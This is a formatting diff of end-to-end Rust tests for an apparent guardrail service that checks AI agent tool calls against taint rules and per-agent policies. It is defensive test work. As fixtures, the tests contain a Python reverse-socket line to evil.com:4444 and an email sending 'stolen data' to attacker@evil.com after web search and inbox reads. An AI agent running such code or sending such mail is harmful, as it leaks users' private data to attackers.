@@ -49,8 +49,7 @@ fn e2e_config() -> Option<(Client, String, String)> {
     }
 
     let url = std::env::var("LILITH_E2E_URL").ok()?;
-    let token = std::env::var("LILITH_ADMIN_TOKEN")
-        .unwrap_or_else(|_| String::new());
+    let token = std::env::var("LILITH_ADMIN_TOKEN").unwrap_or_else(|_| String::new());
 
     let client = Client::builder()
         .timeout(std::time::Duration::from_secs(10))
@@ -185,7 +184,9 @@ async fn analyze(
 /// Server is reachable and has at least one policy loaded.
 #[tokio::test]
 async fn test_e2e_health_check() {
-    let Some((client, base, _)) = e2e_config() else { return };
+    let Some((client, base, _)) = e2e_config() else {
+        return;
+    };
 
     let resp = client
         .post(format!("{base}/validate"))
@@ -207,7 +208,9 @@ async fn test_e2e_health_check() {
 /// Verified against a real captured Copilot Studio session.
 #[tokio::test]
 async fn test_e2e_real_captured_payload_create_table_allowed() {
-    let Some((client, base, _)) = e2e_config() else { return };
+    let Some((client, base, _)) = e2e_config() else {
+        return;
+    };
 
     // This is the verbatim payload from the schema doc (with a fresh conversationId).
     let body = json!({
@@ -291,7 +294,9 @@ async fn test_e2e_real_captured_payload_create_table_allowed() {
 /// (from scripts/test-payload.sh). In a clean session, SendEmail is permitted.
 #[tokio::test]
 async fn test_e2e_real_captured_payload_send_email_clean_session_allowed() {
-    let Some((client, base, _)) = e2e_config() else { return };
+    let Some((client, base, _)) = e2e_config() else {
+        return;
+    };
 
     let conv_id = Uuid::new_v4().to_string();
 
@@ -378,19 +383,32 @@ async fn test_e2e_real_captured_payload_send_email_clean_session_allowed() {
 /// Individual allowed tools each pass in their own clean session.
 #[tokio::test]
 async fn test_e2e_all_otp_demo_tools_allowed_in_clean_sessions() {
-    let Some((client, base, _)) = e2e_config() else { return };
+    let Some((client, base, _)) = e2e_config() else {
+        return;
+    };
 
     let cases = [
         (TOOL_SEARCH_WEB, json!({"query": "test query"})),
         (TOOL_READ_EMAILS, json!({"folder": "Inbox"})),
-        (TOOL_SEND_EMAIL, json!({"to": "clean@otp.hu", "subject": "test", "body": "ok"})),
+        (
+            TOOL_SEND_EMAIL,
+            json!({"to": "clean@otp.hu", "subject": "test", "body": "ok"}),
+        ),
         (TOOL_FETCH_WEBPAGE, json!({"url": "https://example.com"})),
         (TOOL_EXECUTE_PYTHON, json!({"code": "print('hello world')"})),
     ];
 
     for (tool_id, input) in &cases {
         let conv_id = Uuid::new_v4().to_string();
-        let (blocked, _) = analyze(&client, &base, AGENT_OTP_DEMO, &conv_id, tool_id, input.clone()).await;
+        let (blocked, _) = analyze(
+            &client,
+            &base,
+            AGENT_OTP_DEMO,
+            &conv_id,
+            tool_id,
+            input.clone(),
+        )
+        .await;
         assert!(
             !blocked,
             "{tool_id} must be ALLOWED in a clean session — got blocked"
@@ -403,30 +421,50 @@ async fn test_e2e_all_otp_demo_tools_allowed_in_clean_sessions() {
 /// This is the core security invariant Lilith exists to enforce.
 #[tokio::test]
 async fn test_e2e_lethal_trifecta_blocks_email_exfiltration() {
-    let Some((client, base, _)) = e2e_config() else { return };
+    let Some((client, base, _)) = e2e_config() else {
+        return;
+    };
 
     let conv_id = Uuid::new_v4().to_string();
 
     // Step 1: SearchWeb → ALLOW, adds UNTRUSTED_SOURCE taint
     let (blocked, _) = analyze(
-        &client, &base, AGENT_OTP_DEMO, &conv_id, TOOL_SEARCH_WEB,
+        &client,
+        &base,
+        AGENT_OTP_DEMO,
+        &conv_id,
+        TOOL_SEARCH_WEB,
         json!({"query": "how to exfiltrate data"}),
-    ).await;
+    )
+    .await;
     assert!(!blocked, "SearchWeb must be allowed (step 1)");
 
     // Step 2: ReadEmails → ALLOW, adds ACCESS_PRIVATE taint
     let (blocked, _) = analyze(
-        &client, &base, AGENT_OTP_DEMO, &conv_id, TOOL_READ_EMAILS,
+        &client,
+        &base,
+        AGENT_OTP_DEMO,
+        &conv_id,
+        TOOL_READ_EMAILS,
         json!({"folder": "Inbox"}),
-    ).await;
+    )
+    .await;
     assert!(!blocked, "ReadEmails must be allowed (step 2)");
 
     // Step 3: SendEmail to untrusted recipient → BLOCKED (lethal trifecta)
     let (blocked, body) = analyze(
-        &client, &base, AGENT_OTP_DEMO, &conv_id, TOOL_SEND_EMAIL,
+        &client,
+        &base,
+        AGENT_OTP_DEMO,
+        &conv_id,
+        TOOL_SEND_EMAIL,
         json!({"to": "attacker@evil.com", "subject": "stolen data", "body": "..."}),
-    ).await;
-    assert!(blocked, "SendEmail to untrusted recipient after lethal trifecta must be BLOCKED");
+    )
+    .await;
+    assert!(
+        blocked,
+        "SendEmail to untrusted recipient after lethal trifecta must be BLOCKED"
+    );
 
     let reason = body["reason"].as_str().unwrap_or("");
     assert!(
@@ -439,21 +477,42 @@ async fn test_e2e_lethal_trifecta_blocks_email_exfiltration() {
 /// The trusted-recipient allowlist is the only escape valve once both taints are active.
 #[tokio::test]
 async fn test_e2e_lethal_trifecta_trusted_recipient_still_allowed() {
-    let Some((client, base, _)) = e2e_config() else { return };
+    let Some((client, base, _)) = e2e_config() else {
+        return;
+    };
 
     let conv_id = Uuid::new_v4().to_string();
 
     // Accumulate both taints
-    analyze(&client, &base, AGENT_OTP_DEMO, &conv_id, TOOL_SEARCH_WEB,
-        json!({"query": "test"})).await;
-    analyze(&client, &base, AGENT_OTP_DEMO, &conv_id, TOOL_READ_EMAILS,
-        json!({"folder": "Inbox"})).await;
+    analyze(
+        &client,
+        &base,
+        AGENT_OTP_DEMO,
+        &conv_id,
+        TOOL_SEARCH_WEB,
+        json!({"query": "test"}),
+    )
+    .await;
+    analyze(
+        &client,
+        &base,
+        AGENT_OTP_DEMO,
+        &conv_id,
+        TOOL_READ_EMAILS,
+        json!({"folder": "Inbox"}),
+    )
+    .await;
 
     // SendEmail to trusted domain → must still be ALLOWED
     let (blocked, _) = analyze(
-        &client, &base, AGENT_OTP_DEMO, &conv_id, TOOL_SEND_EMAIL,
+        &client,
+        &base,
+        AGENT_OTP_DEMO,
+        &conv_id,
+        TOOL_SEND_EMAIL,
         json!({"to": "colleague@otp.hu", "subject": "internal", "body": "ok"}),
-    ).await;
+    )
+    .await;
     assert!(
         !blocked,
         "SendEmail to @otp.hu must be ALLOWED even after lethal trifecta — trusted recipient"
@@ -464,22 +523,37 @@ async fn test_e2e_lethal_trifecta_trusted_recipient_still_allowed() {
 /// of session taint state. This is a global guardrail, not a taint rule.
 #[tokio::test]
 async fn test_e2e_code_injection_blocked_unconditionally() {
-    let Some((client, base, _)) = e2e_config() else { return };
+    let Some((client, base, _)) = e2e_config() else {
+        return;
+    };
 
     let conv_id = Uuid::new_v4().to_string();
 
     let (blocked, _) = analyze(
-        &client, &base, AGENT_OTP_DEMO, &conv_id, TOOL_EXECUTE_PYTHON,
+        &client,
+        &base,
+        AGENT_OTP_DEMO,
+        &conv_id,
+        TOOL_EXECUTE_PYTHON,
         json!({"code": "import socket; s = socket.socket(); s.connect(('evil.com', 4444))"}),
-    ).await;
-    assert!(blocked, "Python with 'import socket' must be BLOCKED by the code injection guardrail");
+    )
+    .await;
+    assert!(
+        blocked,
+        "Python with 'import socket' must be BLOCKED by the code injection guardrail"
+    );
 
     // Clean Python still allowed (same session — guardrail is per-call, not per-session)
     let conv_id2 = Uuid::new_v4().to_string();
     let (blocked, _) = analyze(
-        &client, &base, AGENT_OTP_DEMO, &conv_id2, TOOL_EXECUTE_PYTHON,
+        &client,
+        &base,
+        AGENT_OTP_DEMO,
+        &conv_id2,
+        TOOL_EXECUTE_PYTHON,
         json!({"code": "result = sum([1, 2, 3])\nprint(result)"}),
-    ).await;
+    )
+    .await;
     assert!(!blocked, "Clean Python must be ALLOWED");
 }
 
@@ -487,54 +561,103 @@ async fn test_e2e_code_injection_blocked_unconditionally() {
 /// contaminate session B. This is the fundamental multi-turn isolation guarantee.
 #[tokio::test]
 async fn test_e2e_session_isolation_taints_do_not_bleed() {
-    let Some((client, base, _)) = e2e_config() else { return };
+    let Some((client, base, _)) = e2e_config() else {
+        return;
+    };
 
     let conv_a = Uuid::new_v4().to_string();
     let conv_b = Uuid::new_v4().to_string();
 
     // Conv A: accumulate both taints
-    analyze(&client, &base, AGENT_OTP_DEMO, &conv_a, TOOL_SEARCH_WEB,
-        json!({"query": "x"})).await;
-    analyze(&client, &base, AGENT_OTP_DEMO, &conv_a, TOOL_READ_EMAILS,
-        json!({"folder": "Inbox"})).await;
-    let (blocked_a, _) = analyze(&client, &base, AGENT_OTP_DEMO, &conv_a, TOOL_SEND_EMAIL,
-        json!({"to": "attacker@evil.com", "subject": "s", "body": "b"})).await;
+    analyze(
+        &client,
+        &base,
+        AGENT_OTP_DEMO,
+        &conv_a,
+        TOOL_SEARCH_WEB,
+        json!({"query": "x"}),
+    )
+    .await;
+    analyze(
+        &client,
+        &base,
+        AGENT_OTP_DEMO,
+        &conv_a,
+        TOOL_READ_EMAILS,
+        json!({"folder": "Inbox"}),
+    )
+    .await;
+    let (blocked_a, _) = analyze(
+        &client,
+        &base,
+        AGENT_OTP_DEMO,
+        &conv_a,
+        TOOL_SEND_EMAIL,
+        json!({"to": "attacker@evil.com", "subject": "s", "body": "b"}),
+    )
+    .await;
     assert!(blocked_a, "Conv A must be blocked after lethal trifecta");
 
     // Conv B: no taints at all — SendEmail must be allowed
-    let (blocked_b, _) = analyze(&client, &base, AGENT_OTP_DEMO, &conv_b, TOOL_SEND_EMAIL,
-        json!({"to": "victim@external.com", "subject": "s", "body": "b"})).await;
-    assert!(!blocked_b, "Conv B must be ALLOWED — taints from Conv A must not bleed");
+    let (blocked_b, _) = analyze(
+        &client,
+        &base,
+        AGENT_OTP_DEMO,
+        &conv_b,
+        TOOL_SEND_EMAIL,
+        json!({"to": "victim@external.com", "subject": "s", "body": "b"}),
+    )
+    .await;
+    assert!(
+        !blocked_b,
+        "Conv B must be ALLOWED — taints from Conv A must not bleed"
+    );
 }
 
 /// Unknown agent ID is denied (fail-closed). Lilith has no policy for this agent.
 #[tokio::test]
 async fn test_e2e_unknown_agent_denied_fail_closed() {
-    let Some((client, base, _)) = e2e_config() else { return };
+    let Some((client, base, _)) = e2e_config() else {
+        return;
+    };
 
     let conv_id = Uuid::new_v4().to_string();
     let unknown_agent = "00000000-0000-0000-0000-000000000000";
 
     let (blocked, _) = analyze(
-        &client, &base, unknown_agent, &conv_id, TOOL_SEARCH_WEB,
+        &client,
+        &base,
+        unknown_agent,
+        &conv_id,
+        TOOL_SEARCH_WEB,
         json!({"query": "test"}),
-    ).await;
-    assert!(blocked, "Unknown agent must be BLOCKED (fail-closed — no policy loaded)");
+    )
+    .await;
+    assert!(
+        blocked,
+        "Unknown agent must be BLOCKED (fail-closed — no policy loaded)"
+    );
 }
 
 /// Financial bot (agent 77236ced) has its own policy — Work IQ Copilot tool is permitted.
 #[tokio::test]
 async fn test_e2e_financial_agent_own_policy_applies() {
-    let Some((client, base, _)) = e2e_config() else { return };
+    let Some((client, base, _)) = e2e_config() else {
+        return;
+    };
 
     let conv_id = Uuid::new_v4().to_string();
 
     // Use a known permitted tool ID from the financial policy
     let (blocked, _) = analyze(
-        &client, &base, AGENT_FINANCIAL, &conv_id,
+        &client,
+        &base,
+        AGENT_FINANCIAL,
+        &conv_id,
         "cra65_financialInsights.action.WorkIQCopilot(Preview)",
         json!({"query": "financial summary"}),
-    ).await;
+    )
+    .await;
     assert!(!blocked, "Financial agent's permitted tool must be ALLOWED");
 }
 
@@ -542,15 +665,22 @@ async fn test_e2e_financial_agent_own_policy_applies() {
 /// (each agent's policy is scoped only to that agent's tools).
 #[tokio::test]
 async fn test_e2e_cross_agent_tool_blocked() {
-    let Some((client, base, _)) = e2e_config() else { return };
+    let Some((client, base, _)) = e2e_config() else {
+        return;
+    };
 
     let conv_id = Uuid::new_v4().to_string();
 
     // OTP SearchWeb tool used under the financial agent — not in that agent's policy
     let (blocked, _) = analyze(
-        &client, &base, AGENT_FINANCIAL, &conv_id, TOOL_SEARCH_WEB,
+        &client,
+        &base,
+        AGENT_FINANCIAL,
+        &conv_id,
+        TOOL_SEARCH_WEB,
         json!({"query": "test"}),
-    ).await;
+    )
+    .await;
     assert!(
         blocked,
         "OTP-demo tool under financial agent must be BLOCKED (not in policy)"
@@ -560,7 +690,9 @@ async fn test_e2e_cross_agent_tool_blocked() {
 /// Malformed request body → HTTP 400, never allowed.
 #[tokio::test]
 async fn test_e2e_malformed_body_returns_400() {
-    let Some((client, base, _)) = e2e_config() else { return };
+    let Some((client, base, _)) = e2e_config() else {
+        return;
+    };
 
     let resp = client
         .post(format!("{base}/analyze-tool-execution"))
@@ -576,8 +708,12 @@ async fn test_e2e_malformed_body_returns_400() {
 /// Admin status reports at least the two deployed agents.
 #[tokio::test]
 async fn test_e2e_admin_status_reports_loaded_policies() {
-    let Some((client, base, token)) = e2e_config() else { return };
-    if token.is_empty() { return }
+    let Some((client, base, token)) = e2e_config() else {
+        return;
+    };
+    if token.is_empty() {
+        return;
+    }
 
     let resp = client
         .get(format!("{base}/admin/status"))
@@ -590,7 +726,10 @@ async fn test_e2e_admin_status_reports_loaded_policies() {
     let body: Value = resp.json().await.unwrap();
 
     let count = body["cedar_policies"].as_u64().unwrap_or(0);
-    assert!(count >= 2, "at least 2 Cedar policies must be loaded, got {count}");
+    assert!(
+        count >= 2,
+        "at least 2 Cedar policies must be loaded, got {count}"
+    );
     assert!(body["loaded_secs_ago"].as_u64().is_some());
     assert!(body["last_reload_ms"].as_u64().is_some());
 }
@@ -598,29 +737,38 @@ async fn test_e2e_admin_status_reports_loaded_policies() {
 /// Admin endpoint without token returns 403.
 #[tokio::test]
 async fn test_e2e_admin_requires_token() {
-    let Some((client, base, _)) = e2e_config() else { return };
+    let Some((client, base, _)) = e2e_config() else {
+        return;
+    };
 
     let resp = client
         .post(format!("{base}/admin/reload-policies"))
         .send()
         .await
         .expect("request failed");
-    assert_eq!(resp.status(), 403, "admin endpoint must require X-Admin-Token");
+    assert_eq!(
+        resp.status(),
+        403,
+        "admin endpoint must require X-Admin-Token"
+    );
 }
 
 /// Upload a test policy, verify the tool is now active, then restore the original.
 /// This is the full policy-update workflow as used by scripts/push-policy.sh.
 #[tokio::test]
 async fn test_e2e_policy_upload_activates_immediately_and_is_restorable() {
-    let Some((client, base, token)) = e2e_config() else { return };
-    if token.is_empty() { return }
+    let Some((client, base, token)) = e2e_config() else {
+        return;
+    };
+    if token.is_empty() {
+        return;
+    }
 
     let test_agent = "e2e-test-agent-upload";
     let conv_id = Uuid::new_v4().to_string();
 
     // Confirm test agent has no policy (denied)
-    let (blocked, _) = analyze(&client, &base, test_agent, &conv_id, "test-tool",
-        json!({})).await;
+    let (blocked, _) = analyze(&client, &base, test_agent, &conv_id, "test-tool", json!({})).await;
     assert!(blocked, "test agent must be denied before upload");
 
     // Upload a minimal policy
@@ -650,8 +798,15 @@ async fn test_e2e_policy_upload_activates_immediately_and_is_restorable() {
 
     // After upload: tool is now allowed
     let conv_id2 = Uuid::new_v4().to_string();
-    let (blocked, _) = analyze(&client, &base, test_agent, &conv_id2, "test-tool",
-        json!({})).await;
+    let (blocked, _) = analyze(
+        &client,
+        &base,
+        test_agent,
+        &conv_id2,
+        "test-tool",
+        json!({}),
+    )
+    .await;
     assert!(!blocked, "test-tool must be ALLOWED after policy upload");
 
     // Clean up: delete the test agent's policy file and reload
@@ -670,30 +825,45 @@ async fn test_e2e_policy_upload_activates_immediately_and_is_restorable() {
 /// Reload in-memory policies and verify the count stays consistent.
 #[tokio::test]
 async fn test_e2e_reload_returns_consistent_count() {
-    let Some((client, base, token)) = e2e_config() else { return };
-    if token.is_empty() { return }
+    let Some((client, base, token)) = e2e_config() else {
+        return;
+    };
+    if token.is_empty() {
+        return;
+    }
 
     let before: Value = client
         .get(format!("{base}/admin/status"))
         .header("x-admin-token", &token)
-        .send().await.unwrap()
-        .json().await.unwrap();
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
 
     let reload: Value = client
         .post(format!("{base}/admin/reload-policies"))
         .header("x-admin-token", &token)
-        .send().await.unwrap()
-        .json().await.unwrap();
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
 
     let after: Value = client
         .get(format!("{base}/admin/status"))
         .header("x-admin-token", &token)
-        .send().await.unwrap()
-        .json().await.unwrap();
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
 
     assert_eq!(
-        before["cedar_policies"],
-        after["cedar_policies"],
+        before["cedar_policies"], after["cedar_policies"],
         "policy count must be stable across reload"
     );
     assert!(
